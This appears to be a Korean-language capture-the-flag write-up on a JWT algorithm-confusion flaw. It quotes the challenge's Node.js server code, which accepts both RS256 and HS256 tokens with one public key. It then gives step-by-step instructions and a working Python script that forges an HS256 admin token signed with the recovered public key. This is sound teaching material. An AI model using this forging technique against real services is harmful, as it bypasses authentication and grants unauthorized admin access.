### JWT(json web token) ?
> jwt는 토큰을 json 구조로 표현한 토큰이고 웹 서버가 클라이언트를 인증하는데 사용해요.  
Header.Payload.signature 구조로 이루어져 있어요.  
Header에는 jwt 서명 생성에 사용할 해쉬 알고리즘과 토큰의 유형 정보를 담고 있으며  
Payload에는 사용자 정보 및 토큰 유효 시간 등 토큰 및 사용과 관련 정보를 담아요.  
Signature는 Header, Payload, Key(pub or pk)를 합쳐서 암호화 한 값을 담고 이 값은 jwt가 변조 됐는지 검증하는데 쓰여요.

## source code analyze

문제의 전체 코드...는 아니고요 너무 길어서 봐야 할 부분만 봐볼께요.

```javascript
const FLAG = readFile('/flag');

const privKey = readFile('/priv.pem');
const verificationKey = readFile('/pub.crt');

const accounts = {
    'admin': {
        'password': FLAG
    },
    'guest': {
        'password': 'guest'
    }
};


function verifyToken(token) {
    try {
        const alg = jwt.decode(token, { complete: true }).header.alg;
        if (alg === 'RS256') {
            return jwt.verify(token, verificationKey);
        } else if (alg === 'HS256') {
            return jwt.verify(token, verificationKey, { algorithms: ['HS256'] });
        } else if (alg === 'ES256') {
            return jwt.verify(token, verificationKey, { algorithms: ['ES256'] });
        } else {
            return false;
        }
    } catch (error) {
        return false;
    }
}

function createAccountToken(username) {
    const payload = {'username': username};
    const options = { expiresIn: '1h', algorithm: 'RS256' };  // We only support RS256 :)

    return jwt.sign(payload, privKey, options);
}

function isAdmin(token) {
    var decoded = verifyToken(token);

    if (decoded.username === 'admin') {
        return true;
    }
    return false;
}

app.get('/login', requireNoAuthentication, (req, res) => {
    res.render('login');
});

app.post('/login', requireNoAuthentication, (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    if (!username || !password) {
        res.status(400);
        res.send('username or password is empty.');
        return;
    }

    res.cookie('token', createAccountToken(username), { httpOnly: true });
    res.redirect('/');
});

app.post('/logout', (req, res) => {
    res.clearCookie('token').redirect('login');
});

app.get('/admin', (req, res) => {
    if (isAdmin(req.cookies.token) !== true) {
        res.status(404);
        res.send('page not found.');
        return;
    }
    res.send(FLAG);
});

app.get('/', requireAuthentication, (req, res) => {
    res.render('index', { isAdmin: isAdmin(req.cookies.token) });
});
```

생성 된 토큰을 검증하는 함수입니다. jwt를 디코딩한 뒤 헤더에 있는 알고리즘 정보를 가져와서 'alg'변수에 담아요.  
그리고 RS256,HS256,ES256 알고리즘으로 jwt 서명을 했다면 통과시켜주는 역할을 하는 함수에요.  
바로 위 내용 중 **RS256과 HS256**을 둘 다 통과시켜주는게 이 문제의 취약점입니다.

### RS256, HS256 ?
> RS256은 비대칭키로 비밀키로 암호화하고 공개키로 복호화 및 검증을해요.  
HS256은 대칭키로서 암호화와 복호화를 똑같은 키로 할 수 있어요.  


만약 아래 함수가 RS256만 통과 시켰더라면 취약점은 없었을꺼에요.  
공개키가 털렸더라도 공격자는 token 검증만 할 수 있을뿐 변조는 불가능하거든요.  
검증이야 뭐 아무리 해봐야 별 의미 없습니다.
따라서 이 부분에서는 HS256과 RS256을 같이 쓰고 있다는점만 알고 가면 됩니다.


```javascript
function verifyToken(token) {
```

## Payload

사진 올리면서 설명해야하는데 너무 귀찮습니다... 다음 문제에는 사진도 좀 올려볼께요

1. /login 페이지에서 guest로 로그인 두 번해서 token 두 개를 가져옵니다.  
2. res_sign2n 툴을 사용해 방금 얻은 token 두 개를 넣어 공개키를 추출합니다.  
3. 다시 /login 페이지에서 guest로 로그인 한 뒤 /admin 페이지에 접근 할 때의 트레픽을 버프스윗 툴을 이용해 intercept합니다.  
4. intercept 한 트레픽을 보면 내가 서버에 보내는 jwt가 있을텐데 이걸 디코딩해서 헤더를 조작합니다.  
5. `{"alg":"RS256", ~~~}.{"username":"guest"}`에서, alg를 HS256으로 바꾸고 username을 admin으로 변경합니다.  
6. 조작한 헤더를 아까 추출한 공개키로 다시 jwt 서명을 합니다(하단 코드 참고)  
7. 버프스윗으로 돌아와서 기존의 jwt를 방금 재서명한 jwt랑 바꿔치기해서 데이터를 전송합니다.
8. admin 권한을 가진 jwt를 받은 서버는 결국 flag를 보여줍니다.

```python
with open('beb3e8d53af065fd_65537_x509.pem', 'r') as f:
    secret = f.read()

header = {"alg": "HS256", "typ": "JWT"}

payload = {
    "username": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

header_enc = base64url_encode(json.dumps(header, separators=(',', ':')))
payload_enc = base64url_encode(json.dumps(payload, separators=(',', ':')))

signing_input = f"{header_enc}.{payload_enc}"

signature = hmac.new(
    secret.encode(),
    signing_input.encode(),
    hashlib.sha256
).digest()

token = f"{signing_input}.{base64url_encode(signature)}"
print(token)
```
